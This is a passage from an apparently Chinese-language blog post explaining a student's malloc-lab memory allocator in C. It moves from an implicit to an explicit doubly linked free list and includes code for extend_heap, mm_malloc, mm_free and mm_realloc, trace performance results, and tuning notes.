$tag$ 进行标记, 根据前后块的 $alloc$ $bit$ 位进行 $free$ $block$ 的合并.</li></ul><h4 id="extend-heap"><a href="#extend-heap" class="headerlink" title="extend_heap"></a>extend_heap</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">extend_heap</span><span class="token punctuation">(</span>size_t words<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span>  size_t size<span class="token punctuation">;</span>  size <span class="token operator">=</span> <span class="token punctuation">(</span>words <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>words <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> WSIZE <span class="token operator">:</span> words <span class="token operator">*</span> WSIZE<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">mem_sbrk</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* Free block header */</span>  <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* Free block footer */</span>  <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* New epilogue header */</span>  <span class="token keyword">return</span> <span class="token function">coalesce</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>用大小为 $size$ 的双字对齐的 $free$ $block$ 扩展堆.</li><li>$epilogue$ $block$ 的 $size$ 为 $0$, $alloc$ $bit$ 位置为 $1$.</li><li>使用 $mem_sbrk$ 分配一个双字对齐块后, $epilogue$ $block$ 变成了 $new$ $free$ $block$ $header$, 下一 $block$ $header$ 特殊化为 $new$ $epilogue$ $block$.</li></ul><h3 id="Malloc-Functions-1"><a href="#Malloc-Functions-1" class="headerlink" title="Malloc Functions"></a>Malloc Functions</h3><h4 id="mm-init-1"><a href="#mm-init-1" class="headerlink" title="mm_init"></a>mm_init</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">mm_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>heap_lo <span class="token operator">=</span> <span class="token function">mem_sbrk</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token function">PUT</span><span class="token punctuation">(</span>heap_lo<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">PUT</span><span class="token punctuation">(</span>heap_lo <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>DSIZE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">PUT</span><span class="token punctuation">(</span>heap_lo <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>DSIZE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">PUT</span><span class="token punctuation">(</span>heap_lo <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  heap_lo <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">extend_heap</span><span class="token punctuation">(</span>CHUNKSIZE <span class="token operator">/</span> WSIZE<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>设置  $prologue$ $block$, $epilogue$ $block$.</li><li>用 $CHUNKSIZE$ 大小的 $free$ $block$ 扩展空堆, 若扩展失败则返回 $NULL$.</li></ul><h4 id="mm-malloc-1"><a href="#mm-malloc-1" class="headerlink" title="mm_malloc"></a>mm_malloc</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mm_malloc</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">)</span> <span class="token punctuation">{</span>  size_t asize<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token comment">/* Adjust block size to include overhead and alignment reqs. */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&lt;=</span> DSIZE<span class="token punctuation">)</span> asize <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> DSIZE<span class="token punctuation">;</span>  <span class="token keyword">else</span> asize <span class="token operator">=</span> DSIZE <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size <span class="token operator">+</span> <span class="token punctuation">(</span>DSIZE<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>DSIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> DSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* Search the free list for a fit */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">first_fit</span><span class="token punctuation">(</span>asize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> bp<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment">/* No fit found. Get more memory and place the block */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">extend_heap</span><span class="token punctuation">(</span><span class="token function">MAX</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> CHUNKSIZE<span class="token punctuation">)</span> <span class="token operator">/</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> bp<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>将 $size$ 对齐至 $16$ 字节, 并扩展加上 $header$, $footer$.</li><li>首先使用 $first$ $fit$ 策略查询 $free$ $list$, 返回一个指向连续内存块的指针.</li><li>若返回为 $NULL$, 则在该处进行 $extend_heap$.</li></ul><h4 id="mm-free-1"><a href="#mm-free-1" class="headerlink" title="mm_free"></a>mm_free</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">mm_free</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">)</span> <span class="token punctuation">{</span>  size_t size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">coalesce</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>将 $alloc$ $bit$ 位置 $0$, 并进行 $free$ $block$ 的合并.</li></ul><h4 id="mm-realloc-1"><a href="#mm-realloc-1" class="headerlink" title="mm_realloc"></a>mm_realloc</h4><ul><li>如果 $ptr$ 为 $NULL$, 直接调用 $mm_malloc$. </li><li>如果 $size$ 为 $0$, 直接调用 $mm_free$. </li><li>否则, 直接调用 $mm_malloc$ 分配 $newptr$, 以下同 $Version$ $0$. </li></ul><h3 id="Performance-1"><a href="#Performance-1" class="headerlink" title="Performance"></a>Performance</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Results <span class="token keyword">for</span> mm malloc:trace            name     valid  util     ops      secs   Kops <span class="token number">1</span>     amptjp-bal.rep       <span class="token function">yes</span>   <span class="token number">90</span>%    <span class="token number">5694</span>  <span class="token number">0.001877</span>   <span class="token number">3033</span> <span class="token number">2</span>       cccp-bal.rep       <span class="token function">yes</span>   <span class="token number">92</span>%    <span class="token number">5848</span>  <span class="token number">0.001071</span>   <span class="token number">5459</span> <span class="token number">3</span>    cp-decl-bal.rep       <span class="token function">yes</span>   <span class="token number">94</span>%    <span class="token number">6648</span>  <span class="token number">0.004788</span>   <span class="token number">1389</span> <span class="token number">4</span>       expr-bal.rep       <span class="token function">yes</span>   <span class="token number">96</span>%    <span class="token number">5380</span>  <span class="token number">0.005364</span>   <span class="token number">1003</span> <span class="token number">5</span> coalescing-bal.rep       <span class="token function">yes</span>   <span class="token number">50</span>%   <span class="token number">14400</span>  <span class="token number">0.000173</span>  <span class="token number">83189</span> <span class="token number">6</span>     random-bal.rep       <span class="token function">yes</span>   <span class="token number">90</span>%    <span class="token number">4800</span>  <span class="token number">0.006984</span>    <span class="token number">687</span> <span class="token number">7</span>    random2-bal.rep       <span class="token function">yes</span>   <span class="token number">87</span>%    <span class="token number">4800</span>  <span class="token number">0.006384</span>    <span class="token number">752</span> <span class="token number">8</span>     binary-bal.rep       <span class="token function">yes</span>   <span class="token number">54</span>%   <span class="token number">12000</span>  <span class="token number">0.015309</span>    <span class="token number">784</span> <span class="token number">9</span>    binary2-bal.rep       <span class="token function">yes</span>   <span class="token number">47</span>%   <span class="token number">24000</span>  <span class="token number">0.007432</span>   <span class="token number">3229</span><span class="token number">10</span>    realloc-bal.rep       <span class="token function">yes</span>   <span class="token number">32</span>%   <span class="token number">14401</span>  <span class="token number">0.141429</span>    <span class="token number">102</span><span class="token number">11</span>   realloc2-bal.rep       <span class="token function">yes</span>   <span class="token number">34</span>%   <span class="token number">14401</span>  <span class="token number">0.003931</span>   <span class="token number">3663</span>Total                             <span class="token number">70</span>%  <span class="token number">112372</span>  <span class="token number">0.194743</span>    <span class="token number">577</span>Score <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">42</span> <span class="token punctuation">(</span>util<span class="token punctuation">)</span> + <span class="token number">2</span> <span class="token punctuation">(</span>thru<span class="token punctuation">))</span> * <span class="token number">11</span>/11 <span class="token punctuation">(</span>testcase<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">44</span>/100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>通过了所有测试文件.</p><p>几乎所有测试点的 $Kops$ 均需进行优化, 最后两个测试 $mm_realloc$ 功能点的 $Memory$ $Utilization$ 过低.</p></blockquote><h2 id="Version-2"><a href="#Version-2" class="headerlink" title="Version 2"></a>Version 2</h2><p>采用 $Explicit$ $Free$ $List$ 组织空闲块, 使用的数据结构为 $Double$ $Linked$ $List$.</p><h3 id="Block-Structure-2"><a href="#Block-Structure-2" class="headerlink" title="Block Structure"></a>Block Structure</h3><p>一个 $block$ 的结构被组织为:</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301958231.png" alt=""></p><p>考虑 $Boundary$ $Tags$ 与 $Alignment$ 条件, 此时 $minimum$ $block$ $size$ 为 $4 * WSIZE\,(32\,Bytes)$.</p><h3 id="Macros-1"><a href="#Macros-1" class="headerlink" title="Macros"></a>Macros</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* 前/后 block 中 payloader 的起始地址 */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PREV_BLK</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> DSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">NEXT_BLK</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HEADER</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token comment">/* 前/后 free block 中 payloader 的起始地址 */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PRED_BLK</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">SUCC_BLK</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp <span class="token operator">+</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>模拟了 $Double$ $Linked$ $List$ 的实现.</li><li>$PRED_BLK$, $SUCC_BLK$ 区别于先前定义的 $PREV_BLK$, $NEXT_BLK$, 用于在 $Explicit$ $Free$ $List$ 中进行前后 $free$ $block$ 的标记.</li></ul><h3 id="Helper-Functions-2"><a href="#Helper-Functions-2" class="headerlink" title="Helper Functions"></a>Helper Functions</h3><h4 id="insert-free-block"><a href="#insert-free-block" class="headerlink" title="insert_free_block"></a>insert_free_block</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">insert_free_block</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">PRED_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token function">SUCC_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">=</span> heap_lo<span class="token punctuation">;</span>  <span class="token function">PRED_BLK</span><span class="token punctuation">(</span>sentinel<span class="token punctuation">)</span> <span class="token operator">=</span> bp<span class="token punctuation">;</span>   heap_lo <span class="token operator">=</span> bp<span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>将 $bp$ ( 指向一个 $free$ $block$ ) 插入 $Explicit$ $Free$ $List$ 的尾部作为 $sentinel$.</li></ul><h4 id="remove-free-block"><a href="#remove-free-block" class="headerlink" title="remove_free_block"></a>remove_free_block</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">remove_free_block</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">PRED_BLK</span><span class="token punctuation">(</span><span class="token function">SUCC_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">PRED_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">PRED_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token function">SUCC_BLK</span><span class="token punctuation">(</span><span class="token function">PRED_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">SUCC_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">else</span>    heap_lo <span class="token operator">=</span> <span class="token function">SUCC_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>将 $bp$ ( 指向一个被分配的 $block$ ) 从 $Explicit$ $Free$ $List$ 中删除.</li><li>需要检查 $bp$ 是否为 $sentinel$.</li></ul><h4 id="first-fit-1"><a href="#first-fit-1" class="headerlink" title="first_fit"></a>first_fit</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">first_fit</span><span class="token punctuation">(</span>size_t asize<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>malloced <span class="token operator">!=</span> asize<span class="token punctuation">)</span> counter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>counter <span class="token operator">&gt;=</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    bp <span class="token operator">=</span> <span class="token function">extend_heap</span><span class="token punctuation">(</span><span class="token function">MAX</span><span class="token punctuation">(</span>asize <span class="token operator">/</span> WSIZE<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> bp<span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> counter<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在 $binary{-}bal.rep$ 与 $binary2{-}bal.rep$ 测试文件中进行了大量相同 $size$ 的 $malloc$ 操作.</p><p>如果重复使用 $first_fit$ 进行检索, 会使 $Kops$ 显著过低.</p></blockquote><ul><li>定义 $malloced$ 为上一次调用 $mm_malloc$ 分配的 $size$ 大小.</li><li>如果重复分配同样 $size$ 的块超过 $48$ 次 ( $48$ 为反复调节获得的最佳参数 ), 则直接调用 $extend_heap$ 将堆扩展相应大小, 不再通过 $first_fit$ 进行检索.</li></ul><h4 id="place-1"><a href="#place-1" class="headerlink" title="place"></a>place</h4><ul><li>若剩余 $payloader$ 需要进行 $split$ 操作, 则先进行 $remove_free_block$, 最后对剩余 $free$ $block$ 进行 $insert_free_block$.</li><li>否则, 直接进行 $remove_free_block$ 并设置 $alloc$ $bit$.</li></ul><h4 id="coalesce-1"><a href="#coalesce-1" class="headerlink" title="coalesce"></a>coalesce</h4><ul><li>仍采用 $immediate$ $coalesce$ 策略.</li><li>在设置 $alloc$ $bit$ 前进行 $remove_free_block$, 最后对合并的 $free$ $block$ 进行 $insert_free_block$.</li></ul><h4 id="extend-heap-1"><a href="#extend-heap-1" class="headerlink" title="extend_heap"></a>extend_heap</h4><ul><li>由于此时 $minimum$ $block$ $size$ 为 $4 <em> WSIZE$, 将 $size$ 双字对齐后, 若其为 $2 </em> WSIZE$, 则置为 $4 * WSIZE$.</li></ul><h3 id="Malloc-Functions-2"><a href="#Malloc-Functions-2" class="headerlink" title="Malloc Functions"></a>Malloc Functions</h3><h4 id="mm-init-2"><a href="#mm-init-2" class="headerlink" title="mm_init"></a>mm_init</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">mm_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">extend_heap</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>$mm_init$ 会调用 $extend_heap$ 预分配一块 $4096\,Bytes$ 大小的空间做为起始 $free$ $block$, $mm_malloc$ 在 $List$ 中没有合适 $free$ $block$ 的情况下总会调用 $extend_heap$ 扩展空间, 其大小取 $4096\,Bytes$ 与待分配大小中较大者.</p><p>在 $coalescing{-}bal.rep$ 中, 起始分配 $4095\,Bytes$ 大小的空间, 经过 $16$ 字节对齐和 $Tag$ 扩展后大于 $4096\,Bytes$, 初始的 $4096\,Bytes$ 空间永远不会被利用.</p><p>只需修改 $mm_init$ 中 $extend_heap$ 初始扩展大小为 $minimun$ $block$ $size$ 即可.</p></blockquote><ul><li>用 $minimun$ $block$ $size$ ( $4$ ) 大小的 $free$ $block$ 扩展空堆, 若扩展失败则返回 $NULL$.</li></ul><h4 id="mm-realloc-2"><a href="#mm-realloc-2" class="headerlink" title="mm_realloc"></a>mm_realloc</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mm_realloc</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">,</span> size_t size<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">mm_free</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>   size_t oldsize <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HEADER</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  size_t newsize <span class="token operator">=</span> size <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>newsize <span class="token operator">&lt;=</span> oldsize<span class="token punctuation">)</span> <span class="token keyword">return</span> bp<span class="token punctuation">;</span>   size_t next_alloc <span class="token operator">=</span> <span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HEADER</span><span class="token punctuation">(</span><span class="token function">NEXT_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   size_t asize <span class="token operator">=</span> oldsize <span class="token operator">+</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HEADER</span><span class="token punctuation">(</span><span class="token function">NEXT_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>next_alloc <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>asize <span class="token operator">&gt;=</span> newsize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token function">remove_free_block</span><span class="token punctuation">(</span><span class="token function">NEXT_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HEADER</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FOOTER</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> bp<span class="token punctuation">;</span>   <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token operator">*</span>newbp <span class="token 